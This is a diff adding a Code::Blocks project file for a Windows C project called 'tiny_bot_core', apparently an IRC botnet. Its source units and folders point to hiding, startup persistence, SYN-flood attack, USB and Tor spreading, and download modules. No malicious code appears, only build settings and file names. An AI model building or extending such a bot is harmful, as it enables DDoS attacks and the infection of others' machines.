@@ -1,0 +1,118 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+<CodeBlocks_project_file>
+	<FileVersion major="1" minor="6" />
+	<Project>
+		<Option title="tiny_bot_core" />
+		<Option platforms="Windows;" />
+		<Option compiler="gcc" />
+		<Option virtualFolders="C\;H\;H\.CONFIG\;C\.CORE\;C\.HELPERS\;C\.SPREAD\;H\.HELPERS\;C\.ATTACK\;" />
+		<Build>
+			<Target title="debug">
+				<Option platforms="Windows;" />
+				<Option output="bin\dbg\tiny_bot_core" prefix_auto="1" extension_auto="1" />
+				<Option object_output="bin\obj\dbg\" />
+				<Option type="1" />
+				<Option compiler="gcc" />
+				<Compiler>
+					<Add option="-W" />
+					<Add option="-pg" />
+					<Add option="-g" />
+				</Compiler>
+				<Linker>
+					<Add option="-pg -lgmon" />
+				</Linker>
+			</Target>
+			<Target title="release">
+				<Option platforms="Windows;" />
+				<Option output="bin\nameless" prefix_auto="1" extension_auto="1" />
+				<Option object_output="bin\obj\rls\" />
+				<Option type="0" />
+				<Option compiler="gcc" />
+				<Compiler>
+					<Add option="-Os" />
+					<Add option="-w" />
+				</Compiler>
+				<Linker>
+					<Add option="-s" />
+				</Linker>
+			</Target>
+		</Build>
+		<Linker>
+			<Add option="-l wininet -g" />
+			<Add library="..\..\..\..\..\Program Files (x86)\CodeBlocks\MinGW\lib\libshlwapi.a" />
+			<Add library="..\..\..\..\..\Program Files (x86)\CodeBlocks\MinGW\lib\libws2_32.a" />
+		</Linker>
+		<Unit filename="apis.c">
+			<Option compilerVar="CC" />
+			<Option virtualFolder="C\.HELPERS\" />
+		</Unit>
+		<Unit filename="apis.h">
+			<Option virtualFolder="H\.HELPERS\" />
+		</Unit>
+		<Unit filename="cryptn.c">
+			<Option compilerVar="CC" />
+			<Option virtualFolder="C\.HELPERS\" />
+		</Unit>
+		<Unit filename="global.c">
+			<Option compilerVar="CC" />
+			<Option virtualFolder="C\.CORE\" />
+		</Unit>
+		<Unit filename="global.h">
+			<Option virtualFolder="H\.HELPERS\" />
+		</Unit>
+		<Unit filename="hider.c">
+			<Option compilerVar="CC" />
+			<Option virtualFolder="C\.HELPERS\" />
+		</Unit>
+		<Unit filename="hider.h">
+			<Option virtualFolder="H\.HELPERS\" />
+		</Unit>
+		<Unit filename="irc.c">
+			<Option compilerVar="CC" />
+			<Option virtualFolder="C\.CORE\" />
+		</Unit>
+		<Unit filename="main.c">
+			<Option compilerVar="CC" />
+			<Option virtualFolder="C\.CORE\" />
+		</Unit>
+		<Unit filename="startup.c">
+			<Option compilerVar="CC" />
+			<Option virtualFolder="C\.HELPERS\" />
+		</Unit>
+		<Unit filename="strings_apis.h">
+			<Option virtualFolder="H\.CONFIG\" />
+		</Unit>
+		<Unit filename="strings_cfg.h">
+			<Option virtualFolder="H\.CONFIG\" />
+		</Unit>
+		<Unit filename="strings_other.h">
+			<Option virtualFolder="H\.CONFIG\" />
+		</Unit>
+		<Unit filename="supersyn.c">
+			<Option compilerVar="CC" />
+			<Option virtualFolder="C\.ATTACK\" />
+		</Unit>
+		<Unit filename="tor.c">
+			<Option compilerVar="CC" />
+			<Option virtualFolder="C\.SPREAD\" />
+		</Unit>
+		<Unit filename="usb+.c">
+			<Option compilerVar="CC" />
+			<Option virtualFolder="C\.SPREAD\" />
+		</Unit>
+		<Unit filename="util.c">
+			<Option compilerVar="CC" />
+			<Option virtualFolder="C\.HELPERS\" />
+		</Unit>
+		<Unit filename="wget.c">
+			<Option compilerVar="CC" />
+			<Option virtualFolder="C\.HELPERS\" />
+		</Unit>
+		<Extensions>
+			<code_completion />
+			<debugger>
+				<search_path add="E:\Documents and Settings\carve\Desktop\Carve\tiny_bot_core\" />
+			</debugger>
+		</Extensions>
+	</Project>
+</CodeBlocks_project_file>
